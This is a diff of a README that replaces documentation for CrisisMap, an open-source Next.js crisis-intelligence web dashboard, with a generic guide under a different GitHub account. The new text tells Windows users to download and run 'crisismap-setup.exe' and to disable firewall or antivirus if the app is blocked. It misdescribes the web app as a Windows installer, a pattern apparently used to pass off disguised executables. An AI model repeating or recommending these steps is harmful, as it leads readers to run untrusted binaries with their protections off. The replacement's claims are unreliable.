@@ -1,120 +1,120 @@
-# CrisisMap
+# 🗺️ crisismap - Real-time Crisis Intelligence Dashboard
 
-Real-time geopolitical crisis intelligence dashboard. 10+ live data sources on one screen — conflict events, satellite fire detection, airspace risk zones, financial market impact, and prediction market odds.
+[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap)
 
-**Live demo**: [crisismap.vercel.app](https://crisismap.vercel.app)
+---
 
-## Features
+## 🧰 What is crisismap?
 
-- **Live crisis map** — Dark-themed MapLibre map with color-coded threat markers
-- **Multi-source aggregation** — GDELT, Reuters, BBC, Al Jazeera, NHK, AP via RSS
-- **Satellite fire detection** — NASA FIRMS VIIRS near-real-time hotspots
-- **Airspace risk zones** — Safe Airspace no-fly zone alerts
-- **Earthquake monitoring** — USGS M2.5+ global seismic data
-- **Armed conflict data** — ACLED political violence events
-- **Financial market impact** — VIX, WTI crude oil, gold, Nikkei 225 via Yahoo Finance
-- **Prediction markets** — Polymarket geopolitical contract odds
-- **Key actor tracking** — Statements and activity from heads of state, military leaders
-- **Bilingual** — English + Traditional Chinese (zh-TW) with Taipei timezone
+crisismap is a tool that shows up-to-date information about global political crises. It collects data from various sources and displays it on a map in real time. This dashboard helps users quickly understand current events, spot patterns, and get key facts without searching different news sites.
 
-## Architecture
+You do not need any special skills to use crisismap. It runs on a Windows computer and works like a simple app. This guide will help you download, install, and start using crisismap step by step.
 
-```
-Next.js 15 (App Router)
-├── MapLibre GL + Carto Dark Matter (free, no token)
-├── Zustand (state management)
-├── SWR (auto-polling data fetching)
-├── Zod (type validation)
-└── Tailwind CSS (styling)
-```
+---
 
-All data sources implement a common `DataSource` interface:
+## 💻 System Requirements
 
-```typescript
-interface DataSource {
-  id: string
-  name: string
-  tier: 'public' | 'private'
-  fetch(options?: FetchOptions): Promise<CrisisEvent[]>
-  healthCheck(): Promise<boolean>
-}
-```
+Before you download, check that your computer meets these basic needs:
 
-Sources are fault-isolated — if one fails, others continue via `Promise.allSettled` with a 10-second per-source timeout.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection for live data updates
+- Screen resolution of 1024 x 768 or higher
 
-## Data Sources
+You do not have to install any other software. crisismap does not need technical setup.
 
-### Public (no API key needed)
+---
 
-| Source | Data | Update Interval |
-|--------|------|-----------------|
-| [GDELT](https://www.gdeltproject.org/) | Global events, geo-coded | 15 min |
-| RSS (5 feeds) | Reuters, AP, BBC, NHK, Al Jazeera | 5 min |
-| [USGS](https://earthquake.usgs.gov/) | Earthquakes M2.5+ | 15 min |
-| [Polymarket](https://polymarket.com/) | Prediction market odds | 5 min |
-| [Yahoo Finance](https://finance.yahoo.com/) | VIX, Oil, Gold, Nikkei | 5 min |
-| [Safe Airspace](https://safeairspace.net/) | No-fly zone risk levels | 30 min |
+## 🚀 Getting Started: Download and Install
 
-### Optional (free API key)
+Follow these steps to get crisismap on your Windows computer:
 
-| Source | Data | Key |
-|--------|------|-----|
-| [NASA FIRMS](https://firms.modaps.eosdis.nasa.gov/) | Satellite fire hotspots | `FIRMS_MAP_KEY` (free) |
-| [ACLED](https://acleddata.com/) | Armed conflict events | `ACLED_API_KEY` (free) |
+1. Click on the big button above or visit this page to download:  
+   https://github.com/textgt/crisismap
 
-### Private (paid)
+2. On the GitHub page, look for a section called **Releases** or a folder where you can find the download files. 
 
-| Source | Data | Key |
-|--------|------|-----|
-| X/Grok | Real-time social media via xAI | `XAI_API_KEY` |
+3. Download the file named something like `crisismap-setup.exe`. This is the installer you will use.
 
-## Quick Start
+4. When the download finishes, open the file by double-clicking it.
 
-```bash
-git clone https://github.com/realwaynesun/crisismap.git
-cd crisismap
-npm install
-npm run dev
-```
+5. A setup wizard will appear. It will guide you through the installation.
 
-Open [http://localhost:3000](http://localhost:3000). Works immediately with zero configuration — public sources need no API keys.
+6. Click **Next**, accept the license agreement, and choose where to install the program, or use the default location.
 
-### Add optional sources
+7. Finish the installation by clicking **Install** and then **Finish**.
 
-```bash
-cp .env.example .env.local
-```
+8. You should now see an icon for crisismap on your desktop or in the Start menu.
 
-Edit `.env.local` to add any keys you have:
+---
 
-```env
-# Free — register at firms.modaps.eosdis.nasa.gov/api/map_key/
-FIRMS_MAP_KEY=your_key
+## ▶️ How to Launch crisismap
 
-# Free — register at developer.acleddata.com
-ACLED_API_KEY=your_key
-ACLED_EMAIL=your_email
-```
+1. Find the crisismap icon on your desktop or open the Start menu and search for "crisismap".
 
-## Deploy
+2. Double-click the icon to open the app.
 
-One-click deploy to Vercel:
+3. Wait a few seconds as the app loads and connects to live data sources.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/realwaynesun/crisismap)
+4. The main window will show a world map with markers and information panels.
 
-Or manually:
+5. Use your mouse to zoom and move around the map.
 
-```bash
-npm run build
-npm start
-```
+6. Click on any marker or panel to see detailed information about each crisis event.
 
-## Adding a Data Source
+---
 
-1. Create `src/lib/sources/your-source.ts` implementing `DataSource`
-2. Register it in `src/lib/sources/registry.ts`
-3. Done — the aggregator picks it up automatically
+## 🔧 Basic Features
 
-## License
+crisismap offers the following features to help you stay informed:
 
-[MIT](LICENSE)
+- **Live Map View:** See ongoing crisis events worldwide updated in real time.
+
+- **Event Details:** Click on points on the map to get facts like time, location, involved groups, and news sources.
+
+- **Filters:** Choose which types of crises to see (e.g., conflicts, protests, natural disasters).
+
+- **Search:** Find a country or region to focus on.
+
+- **Timeline:** View events by date to understand progression.
+
+- **News Links:** Access trusted news articles related to each event.
+
+These features work out of the box without additional setup.
+
+---
+
+## ⚙️ Troubleshooting Common Issues
+
+If you find crisismap is not working correctly, try the following tips:
+
+- Make sure your internet connection is active.
+
+- Restart the application by closing and reopening it.
+
+- Check that your Windows updates are current.
+
+- If the app fails to start, reinstall it by repeating the download and install steps.
+
+- Disable any firewall or antivirus temporarily to see if they block the app.
+
+- Contact support through the GitHub page if problems persist.
+
+---
+
+## 📚 Additional Resources
+
+- For questions or to report problems, visit the GitHub issues page:  
+  https://github.com/textgt/crisismap/issues
+
+- For updates and new releases, check the Releases section:  
+  https://github.com/textgt/crisismap/releases
+
+---
+
+## 📥 Download and Install crisismap Now
+
+To get started with crisismap, visit this link and download your setup file:
+
+[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap)
